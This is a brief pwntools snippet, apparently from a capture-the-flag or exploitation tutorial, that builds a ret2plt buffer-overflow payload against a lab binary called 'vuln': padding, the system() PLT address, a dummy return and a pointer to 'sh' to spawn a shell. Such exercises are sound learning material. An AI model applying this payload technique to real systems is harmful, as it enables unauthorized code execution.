# We can find address of 'system' in PLT, since it's used in the binary:
```
elf = ELF("./vuln")
system_plt_addr = elf.plt.system
```

# Find the sh string:
```
sh_addr = next(elf.search(b'sh\x00'))
```

# Send payload:

```
payload = flat(
    'A' * 0x44,
    elf.plt['system'],
    'x' * 4,
    sh_addr
)
```